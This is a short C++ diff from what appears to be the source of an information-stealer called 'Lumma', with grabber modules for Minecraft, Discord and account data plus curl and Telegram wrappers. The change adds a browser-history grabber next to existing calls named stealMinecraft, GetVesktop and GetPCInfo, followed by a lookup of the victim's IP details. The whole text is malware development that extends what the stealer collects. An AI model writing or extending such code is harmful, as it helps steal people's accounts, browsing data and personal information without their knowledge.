@@ -8,6 +8,7 @@
 #include "grabbers/minecraft.h"
 #include "grabbers/discord.h"
 #include "grabbers/minecraftacc.h"
+#include "grabbers/browser.h"
 
 #include "wrappers/curl.h"
 #include "wrappers/telegram.h"
@@ -27,6 +28,7 @@ namespace Lumma {
         grab::GetVesktop();
         grab::getMinecraftLogs();
         grab::stealMinecraft();
+        grab::GetBrowserHistory();
         grab::GetPCInfo();
 
         curl::HttpResponse res = curl::Get("https://ipinfo.io/json");
